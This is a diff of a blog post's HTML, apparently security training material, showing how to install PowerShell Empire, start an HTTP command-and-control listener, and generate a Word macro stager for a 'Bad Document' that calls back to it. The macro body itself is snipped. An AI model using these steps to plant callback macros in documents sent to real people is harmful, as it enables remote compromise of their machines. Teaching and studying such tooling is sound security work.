@@ -1,326 +1,144 @@
-<!DOCTYPE html>
-<html lang="en">
-  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
-    <title>Powershell Empire | Classroom</title>
-
-    
-<link href="/img/avatar.jpeg" rel="shortcut icon" type="image/x-icon" />
-
-
-
-
-
-<meta name="author" content="Animesh Roy @anir0y  "  />
-<meta name="description" content="" />
-
-
-
-<title>Animesh Roy | Classroom Posts</title>
-<meta name="title" content="Animesh Roy | Blogs & Writeups">
-<meta name="description" content="Animesh Roy has more than a decade worth experience working in cyber security domain. He has worked with governments, corporates, colleges and universities, defence, and the community. He also running a community “Arishti Live” to help everyone who wants to, or work in cyber security domain. His expertise on training & consulting are the best of both the world. He uses his real-life case studies in trainings, to help candidates to understand the job in better ways.">
-
-
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-SPD6BXK0P5"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'G-SPD6BXK0P5');
-</script>
-
-
-
-<script type="text/javascript">
-  (function(c,l,a,r,i,t,y){
-      c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
-      t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
-      y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
-  })(window, document, "clarity", "script", "it10lq8bk1");
-</script>
-
-
-
-<meta property="og:type" content="website">
-<meta property="og:url" content="https://classroom.anir0y.in/">
-<meta property="og:title" content="Animesh Roy | Blogs & Writeups">
-<meta property="og:description" content="This blog contents writeups from CTFs and other infosec related posts also some task related to Classroom training">
-<meta property="og:image" content="https://i.imgur.com/Ji5C41H.png">
-
-
-<script type="text/javascript" charset="UTF-8" src="//cdn.cookie-script.com/s/88cd00f83ae38d0239d06996b1ad293a.js"></script>
-
-
-<meta property="twitter:card" content="summary_large_image">
-<meta property="twitter:url" content="http://localhost:1313/post/powershell-empire-install/">
-
-<meta property="twitter:title" content="Animesh Roy | Blogs & Writeups">
-<meta property="twitter:description" content="This blog contents writeups from CTFs and other infosec related posts also some task related to Classroom training">
-<meta property="twitter:image" content="https://i.imgur.com/Ji5C41H.png">
-
-
-
-
-
-
-
-<script data-ad-client="ca-pub-3526678290068011" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
-
-
-
-
-<link rel="canonical" href="http://localhost:1313/post/powershell-empire-install/" />
-
-
-<meta property="og:url" content="http://localhost:1313/post/powershell-empire-install/">
-  <meta property="og:site_name" content="Classroom">
-  <meta property="og:title" content="Powershell Empire">
-  <meta property="og:description" content="Prereq install pip3 (python Package installer) sudo apt install python3-pip -y Install Poetry sudo pip3 install poetry install Git sudo apt install git -y Install Powershell - Empire git clone --recursive https://github.com/BC-SECURITY/Empire.git cd Empire sudo ./setup/install.sh sudo poetry install sudo poetry run python empire Hacking generate a listener (http) (Empire) &gt; uselistener http (Empire: listeners/http) &gt; info Name: HTTP[S] Category: client_server Authors: @harmj0y Description: Starts a http[s] listener (PowerShell or Python) that uses a GET/POST approach. HTTP[S] Options: Name Required Value Description ---- -------- ------- ----------- Name True http Name for the listener. Host True http://10.128.0.15 Hostname/IP for staging. BindIP True 0.0.0.0 The IP to bind to on the control server. Port True Port for the listener. Launcher True powershell -noP -sta -w 1 -enc Launcher string. [snip] change the IP &amp; port">
-  <meta property="og:locale" content="en">
-  <meta property="og:type" content="article">
-    <meta property="article:section" content="post">
-    <meta property="article:published_time" content="2021-04-02T18:47:08+05:30">
-    <meta property="article:modified_time" content="2021-04-02T18:47:08+05:30">
-    <meta property="article:tag" content="Empire">
-
-
-
-
-  <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="Powershell Empire">
-  <meta name="twitter:description" content="Prereq install pip3 (python Package installer) sudo apt install python3-pip -y Install Poetry sudo pip3 install poetry install Git sudo apt install git -y Install Powershell - Empire git clone --recursive https://github.com/BC-SECURITY/Empire.git cd Empire sudo ./setup/install.sh sudo poetry install sudo poetry run python empire Hacking generate a listener (http) (Empire) &gt; uselistener http (Empire: listeners/http) &gt; info Name: HTTP[S] Category: client_server Authors: @harmj0y Description: Starts a http[s] listener (PowerShell or Python) that uses a GET/POST approach. HTTP[S] Options: Name Required Value Description ---- -------- ------- ----------- Name True http Name for the listener. Host True http://10.128.0.15 Hostname/IP for staging. BindIP True 0.0.0.0 The IP to bind to on the control server. Port True Port for the listener. Launcher True powershell -noP -sta -w 1 -enc Launcher string. [snip] change the IP &amp; port">
-
-
-<link rel="stylesheet" href="/css/semantic.min.css" />
-<link rel="stylesheet" href="/css/icomoon.css" />
-<link rel="stylesheet" href="/css/OverlayScrollbars.min.css" />
-<link rel="stylesheet" href="/css/github-markdown.css" />
-<link rel="stylesheet" href="/css/site.css" />
-<link rel="stylesheet" href="/css/custom.css" />
-
-<style>
-  a:not(.ui.button):hover {
-    text-decoration: underline;
-  }
-
-  
-  a:not(.ui.button) {
-    color: seagreen !important;
-  }
-  
-
-  
-  .inverted a:not(.ui.button),
-  .inverted a:not(.ui.button):hover {
-     color: darkseagreen !important;
-  }
-  
-
-  
-  body.default {
-    
-    background-color: #fff;
-    
-
-    
-  }
-  
-
-  
-  body.dark {
-    
-    background-color: black;
-    
-
-    
-  }
-  
-</style>
-
-
-    
-
-
-
-<link rel="stylesheet" data-highlight href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/styles/tomorrow.min.css" />
-
-
-
-
-
-
-
-    
-    <link rel="stylesheet" href="/css/custom.css" />
-    
-  </head>
-
-  <body class="default">
-    
-<nav class="ui secondary menu dream-menu">
-
-  <div class="item">
-    <i class="large link bullseye icon dream-flip-toggle" title="Flip it!"></i>
-  </div>
-  <div class="item">
-    <i class="large link home icon" title="Home" onclick="window.location.href = 'http:\/\/localhost:1313\/'"></i>
-  </div>
-  
-  <div class="item">
-    <i class="large link icon theme-switch" onclick="themeSwitch()"></i>
-  </div>
-  
-  
-  <div class="item">
-    <i class="large link search icon" onclick="toggleSearch()"></i>
-  </div>
-  
-</nav>
-
-    <div class="flip-container">
-      <div class="flipper">
-        <section class="front">
-          <div class="dream-max-width">
-            
-<div class="ui relaxed grid dream-grid dream-grid-single"style="flex-direction: row-reverse;">
-  <aside class="sixteen wide mobile sixteen wide tablet four wide computer column dream-single-aside">
-    
-    
-    <div class="ui segment toc">
-      <nav id="TableOfContents">
-  <ul>
-    <li><a href="#install-pip3-python-package-installer">install pip3 (python Package installer)</a></li>
-    <li><a href="#install-poetry">Install Poetry</a></li>
-    <li><a href="#install-git">install Git</a></li>
-    <li><a href="#install-powershell---empire">Install Powershell - Empire</a></li>
-  </ul>
-
-  <ul>
-    <li><a href="#generate-a-listener-http">generate a listener (http)</a></li>
-    <li><a href="#payload-macro-for-bad-document">Payload (Macro for Bad Document)</a></li>
-    <li><a href="#put-macro-in-word-file">Put Macro in Word File.</a></li>
-  </ul>
-</nav>
-    </div>
-    
-    <div class="ui segment actions">
-      <button
-        class="ui circular icon button save-as-image"
-        title="Save as image"
-        onclick="savePostAsImg()">
-        <i class="save icon"></i>
-      </button>
-
-      <a href="https://twitter.com/intent/tweet?text=Powershell%20Empire&url=http%3a%2f%2flocalhost%3a1313%2fpost%2fpowershell-empire-install%2f" class="ui circular twitter icon button">
-  <i class="twitter icon"></i>
-</a>
-<a href="https://facebook.com/sharer/sharer.php?u=http%3a%2f%2flocalhost%3a1313%2fpost%2fpowershell-empire-install%2f" class="ui circular facebook icon button">
-  <i class="facebook icon"></i>
-</a>
-
-    </div>
-  </aside>
-  <div class="sixteen wide mobile sixteen wide tablet twelve wide computer column markdown-body dream-single" id="dream-save-post-as-img">
-    
-    <section class="ui top attached segment">
-      <header>
-        <h1 class="ui large header">Powershell Empire<div class="sub header">
-            @
-            
-              
-                <a href="https://anir0y.in" target="_blank">Animesh Roy</a>
-              
-            
-
-            | 
-                Friday, Apr 2, 2021
-              
-
-            | 2 minutes read
-
-            | Update at
-              
-                Friday, Apr 2, 2021
-              
-          </div>
-        </h1>
-      </header>
-
-      <article class="main"><h1 id="prereq">Prereq</h1>
-<h2 id="install-pip3-python-package-installer">install pip3 (python Package installer)</h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo apt install python3-pip -y 
-</span></span></code></pre></div><h2 id="install-poetry">Install Poetry</h2>
-<pre tabindex="0"><code>sudo pip3 install poetry
-</code></pre><h2 id="install-git">install Git</h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo apt install git -y 
-</span></span></code></pre></div><h2 id="install-powershell---empire">Install Powershell - Empire</h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>git clone --recursive https://github.com/BC-SECURITY/Empire.git
-</span></span><span style="display:flex;"><span>cd Empire
-</span></span><span style="display:flex;"><span>sudo ./setup/install.sh
-</span></span><span style="display:flex;"><span>sudo poetry install
-</span></span><span style="display:flex;"><span>sudo poetry run python empire
-</span></span></code></pre></div><hr>
-<h1 id="hacking">Hacking</h1>
-<h2 id="generate-a-listener-http">generate a listener (http)</h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>Empire<span style="color:#f92672">)</span> &gt; uselistener http
-</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>Empire: listeners/http<span style="color:#f92672">)</span> &gt; info
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    Name: HTTP<span style="color:#f92672">[</span>S<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>Category: client_server
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Authors:
-</span></span><span style="display:flex;"><span>  @harmj0y
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Description:
-</span></span><span style="display:flex;"><span>  Starts a http<span style="color:#f92672">[</span>s<span style="color:#f92672">]</span> listener <span style="color:#f92672">(</span>PowerShell or Python<span style="color:#f92672">)</span> that uses a
-</span></span><span style="display:flex;"><span>  GET/POST approach.
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>HTTP<span style="color:#f92672">[</span>S<span style="color:#f92672">]</span> Options:
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  Name              Required    Value                            Description
-</span></span><span style="display:flex;"><span>  ----              --------    -------                          -----------
-</span></span><span style="display:flex;"><span>  Name              True        http                             Name <span style="color:#66d9ef">for</span> the listener.
-</span></span><span style="display:flex;"><span>  Host              True        http://10.128.0.15               Hostname/IP <span style="color:#66d9ef">for</span> staging.
-</span></span><span style="display:flex;"><span>  BindIP            True        0.0.0.0                          The IP to bind to on the control server.
-</span></span><span style="display:flex;"><span>  Port              True                                         Port <span style="color:#66d9ef">for</span> the listener.
-</span></span><span style="display:flex;"><span>  Launcher          True        powershell -noP -sta -w <span style="color:#ae81ff">1</span> -enc   Launcher string.
-</span></span><span style="display:flex;"><span>  <span style="color:#f92672">[</span>snip<span style="color:#f92672">]</span>
-</span></span></code></pre></div><p>change the IP &amp; port</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>Empire: listeners/http<span style="color:#f92672">)</span> &gt; set Host 34.xx.xx.xx
-</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>Empire: listeners/http<span style="color:#f92672">)</span> &gt; set Port <span style="color:#ae81ff">9001</span>
-</span></span></code></pre></div><p>finally execute to start listening</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>Empire: listeners/http<span style="color:#f92672">)</span> &gt; execute
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Starting listener <span style="color:#e6db74">&#39;http&#39;</span>
-</span></span><span style="display:flex;"><span> * Serving Flask app <span style="color:#e6db74">&#34;http&#34;</span> <span style="color:#f92672">(</span>lazy loading<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span> * Environment: production
-</span></span><span style="display:flex;"><span>   WARNING: This is a development server. Do not use it in a production deployment.
-</span></span><span style="display:flex;"><span>   Use a production WSGI server instead.
-</span></span><span style="display:flex;"><span> * Debug mode: off
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Listener successfully started!
-</span></span></code></pre></div><h2 id="payload-macro-for-bad-document">Payload (Macro for Bad Document)</h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>Empire<span style="color:#f92672">)</span> &gt; usestager windows/macro
-</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>Empire: stager/windows/macro<span style="color:#f92672">)</span> &gt; info
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Name: Macro
-</span></span><span style="display:flex;"><span>...<span style="color:#f92672">[</span>snip<span style="color:#f92672">]</span>...
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Options:
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  Name             Required    Value             Description
-</span></span><span style="display:flex;"><span>  ----             --------    -------           -----------
-</span></span><span style="display:flex;"><span>  Listener         True                          Listener to generate stager <span style="color:#66d9ef">for</span>.
-</span></span><span style="display:flex;"><span>  Language         True        powershell        Language of the stager to generate.
-</span></span><span style="display:flex;"><span>  StagerRetries    False       <span style="color:#ae81ff">0</span>                 Times <span style="color:#66d9ef">for</span> the stager to retry
-</span></span><span style="display:flex;"><span>                                                 connecting.
-</span></span><span style="display:flex;"><span>  OutFile          False                         File to output launcher to, otherwise
-</span></span><span style="display:flex;"><span>                                                 displayed on the screen
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>... <span style="color:#f92672">[</span>snip<span style="color:#f92672">]</span>  ...                                            
-</span></span></code></pre></div><p>set the listener value here</p>
-<pre tabindex="0"><code>(Empire: stager/windows/macro) &gt; set Listener http
+<!doctype html><html lang=en dir=auto data-theme=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Powershell Empire | Classroom</title><meta name=keywords content="Empire"><meta name=description content="Prereq
+install pip3 (python Package installer)
+sudo apt install python3-pip -y 
+Install Poetry
+sudo pip3 install poetry
+install Git
+sudo apt install git -y 
+Install Powershell - Empire
+git clone --recursive https://github.com/BC-SECURITY/Empire.git
+cd Empire
+sudo ./setup/install.sh
+sudo poetry install
+sudo poetry run python empire
+
+Hacking
+generate a listener (http)
+(Empire) > uselistener http
+(Empire: listeners/http) > info
+
+    Name: HTTP[S]
+Category: client_server
+
+Authors:
+  @harmj0y
+
+Description:
+  Starts a http[s] listener (PowerShell or Python) that uses a
+  GET/POST approach.
+
+HTTP[S] Options:
+
+  Name              Required    Value                            Description
+  ----              --------    -------                          -----------
+  Name              True        http                             Name for the listener.
+  Host              True        http://10.128.0.15               Hostname/IP for staging.
+  BindIP            True        0.0.0.0                          The IP to bind to on the control server.
+  Port              True                                         Port for the listener.
+  Launcher          True        powershell -noP -sta -w 1 -enc   Launcher string.
+  [snip]
+change the IP & port"><meta name=author content="Animesh Roy"><link rel=canonical href=https://classroom.anir0y.in/post/powershell-empire-install/><link crossorigin=anonymous href=/assets/css/stylesheet.da3211e5ef867bf2b75fd5a6515cfed7195c011e8ab735694e203810a827097b.css integrity="sha256-2jIR5e+Ge/K3X9WmUVz+1xlcAR6KtzVpTiA4EKgnCXs=" rel="preload stylesheet" as=style><link rel=icon href=https://classroom.anir0y.in/img/avatar.jpeg><link rel=icon type=image/png sizes=16x16 href=https://classroom.anir0y.in/img/avatar.jpeg><link rel=icon type=image/png sizes=32x32 href=https://classroom.anir0y.in/img/avatar.jpeg><link rel=apple-touch-icon href=https://classroom.anir0y.in/img/avatar.jpeg><link rel=mask-icon href=https://classroom.anir0y.in/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://classroom.anir0y.in/post/powershell-empire-install/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51);color-scheme:dark}.list{background:var(--theme)}.toc{background:var(--entry)}}@media(prefers-color-scheme:light){.list::-webkit-scrollbar-thumb{border-color:var(--code-bg)}}</style></noscript><script>localStorage.getItem("pref-theme")==="dark"?document.querySelector("html").dataset.theme="dark":localStorage.getItem("pref-theme")==="light"?document.querySelector("html").dataset.theme="light":window.matchMedia("(prefers-color-scheme: dark)").matches?document.querySelector("html").dataset.theme="dark":document.querySelector("html").dataset.theme="light"</script><meta property="og:url" content="https://classroom.anir0y.in/post/powershell-empire-install/"><meta property="og:site_name" content="Classroom"><meta property="og:title" content="Powershell Empire"><meta property="og:description" content="Prereq install pip3 (python Package installer) sudo apt install python3-pip -y Install Poetry sudo pip3 install poetry install Git sudo apt install git -y Install Powershell - Empire git clone --recursive https://github.com/BC-SECURITY/Empire.git cd Empire sudo ./setup/install.sh sudo poetry install sudo poetry run python empire Hacking generate a listener (http) (Empire) > uselistener http (Empire: listeners/http) > info Name: HTTP[S] Category: client_server Authors: @harmj0y Description: Starts a http[s] listener (PowerShell or Python) that uses a GET/POST approach. HTTP[S] Options: Name Required Value Description ---- -------- ------- ----------- Name True http Name for the listener. Host True http://10.128.0.15 Hostname/IP for staging. BindIP True 0.0.0.0 The IP to bind to on the control server. Port True Port for the listener. Launcher True powershell -noP -sta -w 1 -enc Launcher string. [snip] change the IP & port"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="post"><meta property="article:published_time" content="2021-04-02T18:47:08+05:30"><meta property="article:modified_time" content="2021-04-02T18:47:08+05:30"><meta property="article:tag" content="Empire"><meta property="og:image" content="https://classroom.anir0y.in/img/cover.jpg"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://classroom.anir0y.in/img/cover.jpg"><meta name=twitter:title content="Powershell Empire"><meta name=twitter:description content="Prereq
+install pip3 (python Package installer)
+sudo apt install python3-pip -y 
+Install Poetry
+sudo pip3 install poetry
+install Git
+sudo apt install git -y 
+Install Powershell - Empire
+git clone --recursive https://github.com/BC-SECURITY/Empire.git
+cd Empire
+sudo ./setup/install.sh
+sudo poetry install
+sudo poetry run python empire
+
+Hacking
+generate a listener (http)
+(Empire) > uselistener http
+(Empire: listeners/http) > info
+
+    Name: HTTP[S]
+Category: client_server
+
+Authors:
+  @harmj0y
+
+Description:
+  Starts a http[s] listener (PowerShell or Python) that uses a
+  GET/POST approach.
+
+HTTP[S] Options:
+
+  Name              Required    Value                            Description
+  ----              --------    -------                          -----------
+  Name              True        http                             Name for the listener.
+  Host              True        http://10.128.0.15               Hostname/IP for staging.
+  BindIP            True        0.0.0.0                          The IP to bind to on the control server.
+  Port              True                                         Port for the listener.
+  Launcher          True        powershell -noP -sta -w 1 -enc   Launcher string.
+  [snip]
+change the IP & port"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://classroom.anir0y.in/post/"},{"@type":"ListItem","position":2,"name":"Powershell Empire","item":"https://classroom.anir0y.in/post/powershell-empire-install/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Powershell Empire","name":"Powershell Empire","description":"Prereq install pip3 (python Package installer) sudo apt install python3-pip -y Install Poetry sudo pip3 install poetry install Git sudo apt install git -y Install Powershell - Empire git clone --recursive https://github.com/BC-SECURITY/Empire.git cd Empire sudo ./setup/install.sh sudo poetry install sudo poetry run python empire Hacking generate a listener (http) (Empire) \u0026gt; uselistener http (Empire: listeners/http) \u0026gt; info Name: HTTP[S] Category: client_server Authors: @harmj0y Description: Starts a http[s] listener (PowerShell or Python) that uses a GET/POST approach. HTTP[S] Options: Name Required Value Description ---- -------- ------- ----------- Name True http Name for the listener. Host True http://10.128.0.15 Hostname/IP for staging. BindIP True 0.0.0.0 The IP to bind to on the control server. Port True Port for the listener. Launcher True powershell -noP -sta -w 1 -enc Launcher string. [snip] change the IP \u0026amp; port\n","keywords":["Empire"],"articleBody":"Prereq install pip3 (python Package installer) sudo apt install python3-pip -y Install Poetry sudo pip3 install poetry install Git sudo apt install git -y Install Powershell - Empire git clone --recursive https://github.com/BC-SECURITY/Empire.git cd Empire sudo ./setup/install.sh sudo poetry install sudo poetry run python empire Hacking generate a listener (http) (Empire) \u003e uselistener http (Empire: listeners/http) \u003e info Name: HTTP[S] Category: client_server Authors: @harmj0y Description: Starts a http[s] listener (PowerShell or Python) that uses a GET/POST approach. HTTP[S] Options: Name Required Value Description ---- -------- ------- ----------- Name True http Name for the listener. Host True http://10.128.0.15 Hostname/IP for staging. BindIP True 0.0.0.0 The IP to bind to on the control server. Port True Port for the listener. Launcher True powershell -noP -sta -w 1 -enc Launcher string. [snip] change the IP \u0026 port\n(Empire: listeners/http) \u003e set Host 34.xx.xx.xx (Empire: listeners/http) \u003e set Port 9001 finally execute to start listening\n(Empire: listeners/http) \u003e execute [*] Starting listener 'http' * Serving Flask app \"http\" (lazy loading) * Environment: production WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead. * Debug mode: off [+] Listener successfully started! Payload (Macro for Bad Document) (Empire) \u003e usestager windows/macro (Empire: stager/windows/macro) \u003e info Name: Macro ...[snip]... Options: Name Required Value Description ---- -------- ------- ----------- Listener True Listener to generate stager for. Language True powershell Language of the stager to generate. StagerRetries False 0 Times for the stager to retry connecting. OutFile False File to output launcher to, otherwise displayed on the screen ... [snip] ... set the listener value here\n(Empire: stager/windows/macro) \u003e set Listener http (Empire: stager/windows/macro) \u003e execute Sub AutoClose() db End Sub Public Function db() As Variant [snip] Put Macro in Word File. ","wordCount":"293","inLanguage":"en","image":"https://classroom.anir0y.in/img/cover.jpg","datePublished":"2021-04-02T18:47:08+05:30","dateModified":"2021-04-02T18:47:08+05:30","author":{"@type":"Person","name":"Animesh Roy"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://classroom.anir0y.in/post/powershell-empire-install/"},"publisher":{"@type":"Organization","name":"Classroom","logo":{"@type":"ImageObject","url":"https://classroom.anir0y.in/img/avatar.jpeg"}}}</script></head><body id=top><header class=header><nav class=nav><div class=logo><a href=https://classroom.anir0y.in/ accesskey=h title="Classroom (Alt + H)"><img src=https://classroom.anir0y.in/img/avatar.jpeg alt aria-label=logo height=35>Classroom</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
+<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
+<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://classroom.anir0y.in/post/ title=Posts><span>Posts</span></a></li><li><a href=https://classroom.anir0y.in/categories/ title=Categories><span>Categories</span></a></li><li><a href=https://classroom.anir0y.in/tags/ title=Tags><span>Tags</span></a></li><li><a href=https://classroom.anir0y.in/archives/ title=Archives><span>Archives</span></a></li><li><a href=https://classroom.anir0y.in/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li><li><a href=https://classroom.anir0y.in/about/me/ title=About><span>About</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://classroom.anir0y.in/>Home</a>&nbsp;»&nbsp;<a href=https://classroom.anir0y.in/post/>Posts</a></div><h1 class="post-title entry-hint-parent">Powershell Empire</h1><div class=post-meta><span title='2021-04-02 18:47:08 +0530 IST'>April 2, 2021</span>&nbsp;·&nbsp;<span>2 min</span>&nbsp;·&nbsp;<span>Animesh Roy</span>&nbsp;|&nbsp;<span>
+<a href=https://github.com/anir0y/classroom/tree/master/content/post/powershell-empire-install.md rel="noopener noreferrer edit" target=_blank>Suggest Changes</a></span></div></header><figure class=entry-cover><img loading=eager src=https://classroom.anir0y.in/img/cover.jpg alt="cover image"></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#install-pip3-python-package-installer>install pip3 (python Package installer)</a></li><li><a href=#install-poetry>Install Poetry</a></li><li><a href=#install-git>install Git</a></li><li><a href=#install-powershell---empire>Install Powershell - Empire</a></li></ul><ul><li><a href=#generate-a-listener-http>generate a listener (http)</a></li><li><a href=#payload-macro-for-bad-document>Payload (Macro for Bad Document)</a></li><li><a href=#put-macro-in-word-file>Put Macro in Word File.</a></li></ul></nav></div></details></div><div class=post-content><h1 id=prereq>Prereq<a hidden class=anchor aria-hidden=true href=#prereq>#</a></h1><h2 id=install-pip3-python-package-installer>install pip3 (python Package installer)<a hidden class=anchor aria-hidden=true href=#install-pip3-python-package-installer>#</a></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo apt install python3-pip -y 
+</span></span></code></pre></div><h2 id=install-poetry>Install Poetry<a hidden class=anchor aria-hidden=true href=#install-poetry>#</a></h2><pre tabindex=0><code>sudo pip3 install poetry
+</code></pre><h2 id=install-git>install Git<a hidden class=anchor aria-hidden=true href=#install-git>#</a></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo apt install git -y 
+</span></span></code></pre></div><h2 id=install-powershell---empire>Install Powershell - Empire<a hidden class=anchor aria-hidden=true href=#install-powershell---empire>#</a></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>git clone --recursive https://github.com/BC-SECURITY/Empire.git
+</span></span><span class=line><span class=cl><span class=nb>cd</span> Empire
+</span></span><span class=line><span class=cl>sudo ./setup/install.sh
+</span></span><span class=line><span class=cl>sudo poetry install
+</span></span><span class=line><span class=cl>sudo poetry run python empire
+</span></span></code></pre></div><hr><h1 id=hacking>Hacking<a hidden class=anchor aria-hidden=true href=#hacking>#</a></h1><h2 id=generate-a-listener-http>generate a listener (http)<a hidden class=anchor aria-hidden=true href=#generate-a-listener-http>#</a></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>Empire<span class=o>)</span> &gt; uselistener http
+</span></span><span class=line><span class=cl><span class=o>(</span>Empire: listeners/http<span class=o>)</span> &gt; info
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    Name: HTTP<span class=o>[</span>S<span class=o>]</span>
+</span></span><span class=line><span class=cl>Category: client_server
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Authors:
+</span></span><span class=line><span class=cl>  @harmj0y
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Description:
+</span></span><span class=line><span class=cl>  Starts a http<span class=o>[</span>s<span class=o>]</span> listener <span class=o>(</span>PowerShell or Python<span class=o>)</span> that uses a
+</span></span><span class=line><span class=cl>  GET/POST approach.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>HTTP<span class=o>[</span>S<span class=o>]</span> Options:
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  Name              Required    Value                            Description
+</span></span><span class=line><span class=cl>  ----              --------    -------                          -----------
+</span></span><span class=line><span class=cl>  Name              True        http                             Name <span class=k>for</span> the listener.
+</span></span><span class=line><span class=cl>  Host              True        http://10.128.0.15               Hostname/IP <span class=k>for</span> staging.
+</span></span><span class=line><span class=cl>  BindIP            True        0.0.0.0                          The IP to <span class=nb>bind</span> to on the control server.
+</span></span><span class=line><span class=cl>  Port              True                                         Port <span class=k>for</span> the listener.
